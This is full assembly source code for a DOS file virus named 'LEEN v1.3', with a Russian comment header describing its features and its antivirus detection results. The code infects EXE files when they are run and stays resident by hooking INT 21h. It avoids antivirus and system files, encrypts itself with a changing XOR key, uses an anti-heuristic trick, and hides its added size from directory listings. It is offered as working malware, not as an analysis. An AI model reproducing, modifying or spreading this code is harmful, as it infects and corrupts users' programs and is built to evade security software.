;
;                               <<LEEN v1.3>>
;
;   Резидентный стандартный *.ЕХЕ инфектор.
; - Зависает в старших адресах памяти при помощи функций DOS
; - В качестве признака заражения памяти использует 0FEA1h/INT 21h, если код
;   в регистре AX при возврате = OFEA1h, память заражена.
; - Заражает при: Запуске (AX=4B00h)
; - Не заражает файлы, имена которых начинаются с:
;           "COMMA" (Command.com в DOS 7.0 имеет ЕХЕ формат.)
;           "DRWEB" (Паутиныча тоже не будем заражать.)
;           "DN.PR" (Это - DN.PRG - кусок Dos NaFigatora. Глючит ужасно.)
;           "CV.EX" (Это отладчик CODEVIEW от MICRO$OFT. Этим всё сказано.)
; - Не заражает оверлейные файлы.
; - Не заражает файлы WINDOWS.
; - Сохраняет атрибуты/дату/время файла
; - Заражает файлы с любыми атрибутами
; - Шифруется по XOR с переменным ключом, зависящим от сотой доли секунды
;   системного времени.
; - Содержит небольшую антиэвристику в расшифровщике.
; - Stealth при поиске файла (4eh,4fh) ПРИМ.: Стелсирование не фурычит, если
;   поиск идёт из другого каталога, т.к. файл пытается открыться в текущем,
;   т.е. в том, в котором файла, естественно нет.
;
; DrWeb - OK
;       Memory - INFECTED!!!
; NAV   - ?
; AVP   - OK
;       Memory - OK
;
; 29.04.00                                         (C) GOBLEEN WARRIORS INC.
                        .286
                        .model tiny
                        .code
virlen                  equ virend-virus
virpar                  equ (virlen+15)/16
cryptlen                equ virend-cryptstart
uncryptedlen            equ cryptstart-virus
                        org 100h
start:                  jmp short virus
ourhost:                db 0cdh,20h,0
virus:                  call near ptr delta
delta:                  int 01h
                        pop bp
                        sub bp,offset delta
                        pusha
                        push ds
                        push es
                        push cs
                        pop ds
;uncrypt
                        push es
                        mov es,ax
                        lea si,[bp+uncryptor]
                        mov di,0300h
                        movsw
                        movsb
                        push cs
                        pop es
                        lea si,[bp+cryptstart]
                        mov di,si
                        mov cx,cryptlen
uncrypt:                db 0b3h
key:                    db 0
                        lodsb
                        push cs
                        lea dx,[bp+next]
                        push dx
                        db 0eah
                        dw 0300h
                        dw 0000h
next:                   stosb
                        loop uncrypt
                        pop es
                        lea dx,[bp+cryptstart]
                        push cs
                        push dx
uncryptor:              xor al,bl
                        retf
;crypted part
cryptstart:             mov ax,word ptr [bp+exe_cs]
                        mov word ptr [bp+_cs],ax
;test for already resident
                        mov ax,0FEA1h
                        int 21h
                        cmp ax,0FEA1h
                        jne install
;return to host
restore_all_stuff:      pop es
                        pop ds
                        popa
;return
                        mov ax,es
                        add ax,10h
                        add word ptr [bp+_cs],ax
                        mov bx,word ptr [bp+exe_ip]
                        mov word ptr [bp+_ip],bx
                        cli
                        mov sp,word ptr [bp+exe_sp]
                        add ax,word ptr [bp+exe_ss]
                        mov ss,ax
                        sti
                        xor ax,ax
                        xor bx,bx
                        xor cx,cx
                        xor dx,dx
                        xor di,di
                        xor si,si
                        xor bp,bp
                        db 0eah
_ip                     dw 0
_cs                     dw 0
;***************************************************************************
;*  INSTALL                                                                *
;***************************************************************************
install:                mov ah,4ah
                        mov bx,0ffffh
                        int 21h
                        sub bx,virpar+2
                        mov ah,4ah
                        int 21h
                        mov ah,48h
                        mov bx,virpar+1
                        int 21h
                        push ax
                        dec ax
                        push ax
                        pop es
                        mov byte ptr es:[0],'Z'
                        mov word ptr es:[1],8
;copy vir to mem
                        pop es
                        mov cx,virlen+5
                        lea si,[bp+start]
                        mov di,100h
                        rep movsb
;hook interrupts
                        push es
                        pop ds
                        mov ax,3521h
                        int 21h
                        mov word ptr ds:[old_int21],bx
                        mov word ptr ds:[old_int21+2],es
                        mov ax,2521h
                        lea dx,ds:[new_int21]
                        int 21h
;return to host
                        jmp restore_all_stuff
;****************************************************************************
;* NEW INT 21 HANDLER                                                       *
;****************************************************************************
new_int21:              cmp ax,0FEA1h
                        je testing
                        cmp ax,4b00h
                        je infect
                        cmp ah,4eh   ;
                        je find_f    ; STEALTH
                        cmp ah,4fh   ;
                        je find_f    ;

;return to old handler
not_infect:             db 0eah
old_int21:              dd 0
testing:                iret
;stealth routine
find_f:                 pushf
                        call dword ptr cs:[old_int21]
                        jc s_exit
                        pushf
                        pusha
                        push ds
                        push es
                        mov ah,2fh           ;adress of current DTA in ES:BX
                        int 21h
                        mov bp,bx            ;BP=BX
                        push es              ;ES=DS
                        pop ds
                        mov ax,3d00h         ;open file
                        xor cx,cx            ;all atributes
                        lea dx,[bp+1eh]      ;name in DTA DS:BX
                        int 21h
                        jc s_restore         ;errors? - exit
                        xchg ax,bx           ;file descriptor in BX
                        push cs              ;DS=CS
                        pop ds
                        mov ah,3fh           ;read
                        mov cx,1ch           ;2 bytes
                        lea dx,[header]      ;to CS:[header]
                        int 21h
                        jc s_closef
                        cmp word ptr [header],'ZM' ;test for EXE
                        jne s_closef         ;not equial? Close f
                        cmp word ptr [header+10h],0fcfdh ;test for alredy
                        jne s_closef         ;not equial? Close f
                        sub word ptr es:[bp+1ah],virlen
s_closef:               mov ah,3eh
                        int 21h
s_restore:              pop es
                        pop ds
                        popa
                        popf
s_exit:                 retf 2             ;return & getout frm stack 2 bytes
;infector
infect:
;save all shit
                        pushf
                        pusha
                        push es
                        push ds
;test for command.com (it have EXE structure in dos 7.0) & bad programs
                        lea di,[badfile1]
                        call near ptr lookforfile
                        cmp al,0
                        je notcommand
                        jmp exit
notcommand:             lea di,[badfile2]
                        call near ptr lookforfile
                        cmp al,0
                        je notdrweb
                        jmp exit
notdrweb:               lea di,[badfile3]
                        call near ptr lookforfile
                        cmp al,0
                        je notdn
                        jmp exit
notdn:                  lea di,[badfile4]
                        call near ptr lookforfile
                        cmp al,0
                        je allisok
                        jmp exit
badfile1                db 'COMMA'
badfile2                db 'DRWEB'
badfile3                db 'DN.PR'
badfile4                db 'CV.EX'
allisok:
;save file atributes and set 'em to arch
                        mov ax,4300h
                        int 21h
                        mov word ptr cs:[f_attr],cx
                        mov ax,4301h
                        xor cx,cx
                        int 21h
                        jnc save_name
                        jmp rest_attr
;save file name offset
save_name:              mov word ptr cs:[f_name],dx
;open file for R/W
                        mov ax,3d02h
                        int 21h
                        jnc not_error1
                        jmp rest_attr
not_error1:             xchg ax,bx
                        push cs
                        pop ds
;save file time/date
                        mov ax,5700h
                        int 21h
                        mov word ptr [f_time],cx
                        mov word ptr [f_date],dx
;read EXE header
                        mov ah,3fh
                        mov cx,1ch
                        lea dx,[header]
                        int 21h
;test for MZ
                        cmp word ptr [header],'ZM'
                        je itsexe
                        jmp close
;test for already
itsexe:                 cmp word ptr [header+10h],0fcfdh
                        jne itsnotinfected
                        jmp close
;test for overlay
itsnotinfected:         cmp word ptr [header+1ah],0
                        je notoverlay
                        jmp close
;test for windows file
notoverlay:             cmp word ptr [header+18h],'@'
                        jne so_infectit
                        jmp close
;store main parts of header
so_infectit:            mov ax,word ptr [header+0eh]
                        mov word ptr [exe_ss],ax
                        mov ax,word ptr [header+10h]
                        mov word ptr [exe_sp],ax
                        mov ax,word ptr [header+14h]
                        mov word ptr [exe_ip],ax
                        mov ax,word ptr [header+16h]
                        mov word ptr [exe_cs],ax
;goto eof
                        mov ax,4202h
                        xor cx,cx
                        cwd
                        int 21h
                        push bx ax dx
;calc new main parts
                        mov bx,word ptr [header+8h]
                        mov cl,4
                        shl bx,cl
                        sub ax,bx
                        sbb dx,0
                        mov cx,10h
                        div cx
;make new haeader main parts
                        mov word ptr [header+14h],dx
                        mov word ptr [header+16h],ax
                        mov word ptr [header+0eh],ax
                        mov word ptr [header+10h],0fcfdh
                        pop dx ax bx
;calc new PartPage & PageCnt
                        add ax,virlen
                        adc dx,0
                        mov cx,512
                        div cx
                        inc ax
                        mov word ptr [header+4h],ax
                        mov word ptr [header+2h],dx
;fresh a KEY to crypt
another:                mov ah,2ch
                        int 21h
                        or dl,dl
                        jz another
                        cmp dl,32
                        je another
                        mov byte ptr [key],dl
;crypt body
                        push cs
                        pop es
                        lea si,[cryptstart]
                        lea di,[cryptbuf]
                        mov cx,cryptlen
cryptor:                mov al,[si]
                        inc si
                        xor al,dl
                        mov [di],al
                        inc di
                        loop cryptor
;write uncrypted part of our body (pointer is in EOF)
                        mov ah,40h
                        mov cx,uncryptedlen
                        lea dx,[virus]
                        int 21h
;write crypted part of our body
                        mov ah,40h
                        mov cx,cryptlen
                        lea dx,[cryptbuf]
                        int 21h
;goto BOF
                        mov ax,4200h
                        xor cx,cx
                        cwd
                        int 21h
;write new header
                        mov ah,40h
                        mov cx,1ch
                        lea dx,[header]
                        int 21h
;restore file time/date
                        mov ax,5701h
                        db 0b9h
f_time                  dw ?
                        db 0bah
f_date                  dw ?
                        int 21h
;closefile
close:                  mov ah,3eh
                        int 21h
;restore attributes
rest_attr:              pop ds
                        push ds
                        mov ax,4301h
                        db 0b9h
f_attr                  dw ?
                        db 0bah
f_name                  dw ?
                        int 21h
;restore all shit
exit:                   pop ds
                        pop es
                        popa
                        popf
                        jmp not_infect

lookforfile proc
                        mov si,dx
searchzero:             cmp ds:[si],byte ptr 0
                        je foundzero
                        inc si
                        jmp short searchzero
foundzero:              cmp ds:[si],byte ptr '\'
                        je foundslash
                        dec si
                        jmp short foundzero
foundslash:             inc si
                        mov cx,5
cmpre:                  mov al,[si]
                        cmp byte ptr cs:[di],al
                        jne goodfile
                        inc si
                        inc di
                        loop cmpre
badfile:                mov al,1
                        retn
goodfile:               mov al,0
                        retn
lookforfile endp

;DATABANK
ourname                 db '[LEEN v1.3] by GOBLEEN WARRIORS INC.'
exe_cs                  dw 0fff0h
exe_ip                  dw 0
exe_sp                  dw 0
exe_ss                  dw 0
virend:
header                  db 1ch dup (?)
cryptbuf:
end start
